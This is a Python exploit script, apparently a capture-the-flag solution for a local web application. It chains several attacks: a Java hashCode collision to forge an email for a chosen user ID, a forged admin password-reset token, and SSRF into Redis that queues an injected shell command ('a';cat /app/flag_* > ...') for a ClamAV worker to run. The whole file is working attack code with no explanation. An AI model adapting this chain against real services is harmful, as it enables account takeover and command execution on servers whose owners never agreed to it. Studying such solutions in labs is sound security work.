import base64
import random
import uuid
import requests
import time

TARGET = "http://localhost:6969/"
PASSWORD = "password123"

def java_hash(s: str) -> int:
    h = 0
    for ch in s:
        h = (31 * h + ord(ch)) & 0xFFFFFFFF
    if h & 0x80000000:
        h -= 0x100000000
    return h

ADMIN_HASH = java_hash("admin@example.com")

def find_string_for_hash(target_hash: int, max_len: int = 10, attempts: int = 400000) -> str:
    targ_u = target_hash & 0xFFFFFFFF
    for L in range(3, max_len + 1):
        for _ in range(attempts):
            prefix_chars = []
            for _ in range(L - 1):
                c = random.randint(1, 0xFFFF)
                while 0xD800 <= c <= 0xDFFF:  # skip UTF-16 surrogate range
                    c = random.randint(1, 0xFFFF)
                prefix_chars.append(chr(c))
            prefix = "".join(prefix_chars)
            h = 0
            for ch in prefix:
                h = (31 * h + ord(ch)) & 0xFFFFFFFF
            c = (targ_u - ((h * 31) & 0xFFFFFFFF)) & 0xFFFFFFFF
            if c <= 0xFFFF and not (0xD800 <= c <= 0xDFFF):
                s = prefix + chr(c)
                if java_hash(s) == target_hash:
                    return s
    raise RuntimeError("Failed to find string for hash")

def register_user(session: requests.Session, username: str, email: str, password: str) -> dict:
    endpoint = TARGET + "api/auth/register"
    data = {
        "username": username,
        "email": email,
        "password": password,
        "confirmPassword": password,
    }
    resp = session.post(endpoint, json=data)
    if resp.ok and resp.json().get("status") == "success":
        print(f"[+] Registered {username!r} with email {email.encode('unicode_escape').decode()}")
        return resp.json()
    print("[-] Registration failed", resp.status_code, resp.text)
    return {}

def login_user(session: requests.Session, username: str, password: str) -> dict:
    endpoint = TARGET + "api/auth/login"
    data = {
        "username": username,
        "password": password,
    }
    resp = session.post(endpoint, json=data)
    if "success" in resp.text:
        print(f"[+] Logged in as {username!r}")
        return resp.json()
    print("[-] Login failed", resp.status_code, resp.text)
    return {}

def fetch_profile(session: requests.Session) -> dict:
    resp = session.get(TARGET + "api/user/profile")
    try:
        return resp.json().get("data", {})
    except Exception:
        print("[-] Failed to fetch profile", resp.status_code, resp.text)
        return {}

def send_password_reset(session: requests.Session, email: str) -> None:
    endpoint = TARGET + "api/auth/send-password-reset"
    resp = session.post(endpoint, json={"email": email})
    print(f"[+] Sent reset for {email.encode('unicode_escape').decode()}: {resp.text}")

def get_reset_token(session: requests.Session, email: str) -> str:
    endpoint = TARGET + "api/auth/email"
    resp = session.get(endpoint)
    try:
        lines = resp.json().get("data", [])
    except Exception:
        print("[-] Failed to parse email endpoint:", resp.text)
        return ""

    for line in lines:
        if email in line:
            token = line.split("token=")[1].split("]")[0]
            print(f"[+] Found reset token line: {line}")
            return token
    print(f"[-] No reset token found for {email.encode('unicode_escape').decode()}")
    return ""

def reset_password(session: requests.Session, email, token, new_password):
    endpoint = TARGET + "api/auth/reset-password"
    data = {
        "email": email,
        "token": token,
        "password": new_password,
    }
    resp = session.post(endpoint, json=data)
    if "success" in resp.text:
        print(f"[+] Password reset successful for {email.encode('unicode_escape').decode()}")
    else:
        print(f"[-] Password reset failed for {email.encode('unicode_escape').decode()}: {resp.text}")

def upload_file(session: requests.Session, data: bytes, name: str = "payload.bin") -> dict:
    files = {"file": (name, data, "application/octet-stream")}
    resp = session.post(TARGET + "api/file/upload", files=files)
    print("[+] Upload response:", resp.text)
    listing = session.get(TARGET + "api/file/").json().get("data", [])
    return listing[-1] if listing else {}

def craft_resp_lpush(payload: str) -> str:
    payload_bytes = payload.encode()
    return (
        f"*3\r\n$5\r\nLPUSH\r\n$12\r\nclamav_queue\r\n${len(payload_bytes)}\r\n"
        f"{payload}\r\n"
    )

def inject_clamav_command(session: requests.Session, out_path: str, flag_glob: str = "/app/flag_*") -> str:
    payload = f"a';cat {flag_glob} > {out_path} #'"
    method = craft_resp_lpush(payload)
    resp = session.post(
        TARGET + "api/file/remote-upload",
        json={"url": "http://127.0.0.1:6379/", "filename": "x", "httpMethod": method},
    )
    print("[+] Inject response:", resp.text)
    return resp.text

def download_file(session: requests.Session, file_id: int) -> bytes:
    resp = session.post(TARGET + "api/file/download", json={"fileId": file_id})
    data = resp.json().get("data", {}) or {}
    b64 = data.get("base64", "")
    return base64.b64decode(b64) if b64 else b""

if __name__ == "__main__":
    probe_session = requests.Session()
    probe_username = f"probe_{uuid.uuid4().hex[:8]}"
    probe_email = f"{probe_username}@example.com"
    register_user(probe_session, probe_username, probe_email, PASSWORD)
    probe_profile = fetch_profile(probe_session)
    probe_id = probe_profile.get("id")
    if not probe_id:
        print("[-] Could not determine probe user ID; aborting")
        exit(1)
    print(f"[+] Probe user id: {probe_id}")

    target_id = probe_id + 1
    target_hash = ADMIN_HASH + (1 - target_id)
    crafted_email = find_string_for_hash(target_hash)
    print(f"[+] Crafted email for userId {target_id}: {crafted_email.encode('unicode_escape').decode()}")

    crafted_session = requests.Session()
    crafted_username = f"hacker_{uuid.uuid4().hex[:8]}"
    register_user(crafted_session, crafted_username, crafted_email, PASSWORD)
    crafted_profile = fetch_profile(crafted_session)
    crafted_id = crafted_profile.get("id")
    print(f"[+] Crafted user id: {crafted_id}")
    if crafted_id != target_id:
        print("[-] Crafted user id mismatch; adjust logic and retry")
        exit(1)

    send_password_reset(crafted_session, crafted_email)
    token = get_reset_token(crafted_session, crafted_email)
    if token:
        uuid_part = token.split("|")[0]
        print(f"[+] Victim token: {token}")
        print(f"[+] Admin-forged token: {uuid_part}|1")
        admin_token = f"{uuid_part}|1"
    else:
        print("[-] Could not retrieve reset token; aborting")
        exit(1)

    reset_password(crafted_session, "admin@example.com", admin_token, PASSWORD)

    admin_session = requests.Session()
    login_user(admin_session, "admin", PASSWORD)

    entry = upload_file(admin_session, b"hello", name="holder.txt")
    out_path = entry.get("filePath")
    file_id = entry.get("id")
    if not out_path or not file_id:
        print("[-] Could not get uploaded file info; aborting")
        exit(1)
    print(f"[+] Uploaded file path: {out_path}, id: {file_id}")

    inject_clamav_command(admin_session, out_path)

    print("[*] Waiting for ClamAV to scan")
    time.sleep(120)

    flag_data = download_file(admin_session, file_id)
    print(f"[+] Retrieved file data:\n{flag_data.decode(errors='ignore')}")
